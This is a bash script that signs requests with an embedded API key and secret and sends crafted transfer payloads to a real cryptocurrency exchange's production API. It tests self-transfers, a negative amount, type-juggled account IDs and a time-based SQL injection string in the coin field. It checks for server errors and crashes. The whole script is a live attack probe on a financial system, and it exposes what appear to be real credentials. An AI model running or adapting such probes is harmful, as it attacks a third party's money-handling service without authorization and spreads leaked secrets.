#!/bin/bash
# CRITICAL VERIFICATION: 10016 SYSTEM ERROR
# Analyzing the nature of the crash

API_KEY="22JSr5zWpW0eReC6rE"
API_SECRET="QZhQLj0tXsbSeTHYHnvoB99GKILfFdMkzWYN"
BASE="https://api.bybit.com"
UID="527465456"

# Sync Time
OFFSET=$(($(curl -s "$BASE/v5/market/time" | grep -o '"timeSecond":"[0-9]*"' | cut -d'"' -f4) - $(date +%s)))

sign() {
    local p=$1
    local t=$(($(date +%s) + OFFSET))000
    local s=$(echo -n "${t}${API_KEY}5000${p}" | openssl dgst -sha256 -hmac "$API_SECRET" | awk '{print $2}')
    echo "$t|$s"
}

verify_crash() {
    local name=$1
    local payload=$2
    
    echo "---------------------------------------------------"
    echo "Testing: $name"
    
    IFS='|' read -r ts sig <<< $(sign "$payload")
    
    # Measure time
    start_time=$(date +%s%N)
    
    resp=$(curl -s -w "|HTTP:%{http_code}" -X POST "$BASE/v5/asset/transfer/inter-transfer" \
        -H "X-BAPI-API-KEY: $API_KEY" \
        -H "X-BAPI-SIGN: $sig" \
        -H "X-BAPI-SIGN-TYPE: 2" \
        -H "X-BAPI-TIMESTAMP: $ts" \
        -H "X-BAPI-RECV-WINDOW: 5000" \
        -H "Content-Type: application/json" \
        -d "$payload")
        
    end_time=$(date +%s%N)
    duration=$(( (end_time - start_time) / 1000000 ))
    
    http_code=$(echo "$resp" | awk -F"|HTTP:" '{print $2}')
    body=$(echo "$resp" | awk -F"|HTTP:" '{print $1}')
    retCode=$(echo "$body" | grep -o '"retCode":[0-9]*' | cut -d':' -f2)
    
    echo "Time: ${duration}ms"
    echo "HTTP: $http_code"
    echo "RetCode: $retCode"
    echo "Body: $body"
    
    if [ "$retCode" == "10016" ]; then
        echo "✅ CONFIRMED: 10016 System Error triggered."
    elif [ "$http_code" == "500" ] || [ "$http_code" == "502" ]; then
         echo "🚨 CRITICAL: REAL SERVER CRASH (HTTP 5xx)"
    else
         echo "ℹ️  Handled: $retCode"
    fi
}

echo "=========================================="
echo "VERIFYING 10016 VULNERABILITY"
echo "=========================================="

# 1. BASELINE CRASH (Targeting Self)
# Should fail gracefully (Can't transfer to self), but crashes?
UUID=$(cat /proc/sys/kernel/random/uuid)
verify_crash "Self Transfer (Logic Check)" "{\"transferId\":\"$UUID\",\"coin\":\"USDT\",\"amount\":\"0.01\",\"fromMemberId\":$UID,\"toMemberId\":$UID}"

# 2. NEGATIVE AMOUNT (Validation Check)
# Should be blocked by validator, but crashes?
UUID=$(cat /proc/sys/kernel/random/uuid)
verify_crash "Negative Amount (-100)" "{\"transferId\":\"$UUID\",\"coin\":\"USDT\",\"amount\":\"-100\",\"fromMemberId\":$UID,\"toMemberId\":$UID}"

# 3. TYPE JUGGLING (String vs Int)
# Sending ID as string vs int
UUID=$(cat /proc/sys/kernel/random/uuid)
verify_crash "Type Juggling (String ID)" "{\"transferId\":\"$UUID\",\"coin\":\"USDT\",\"amount\":\"0.01\",\"fromMemberId\":\"$UID\",\"toMemberId\":\"$UID\"}"

# 4. SQL INJECTION PROBE (Time-based)
# If this takes significantly longer than baseline, it's suspicious
UUID=$(cat /proc/sys/kernel/random/uuid)
verify_crash "SQLi Probe (Sleep)" "{\"transferId\":\"$UUID\",\"coin\":\"USDT' AND SLEEP(5)--\",\"amount\":\"0.01\",\"fromMemberId\":$UID,\"toMemberId\":$UID}"

echo "=========================================="
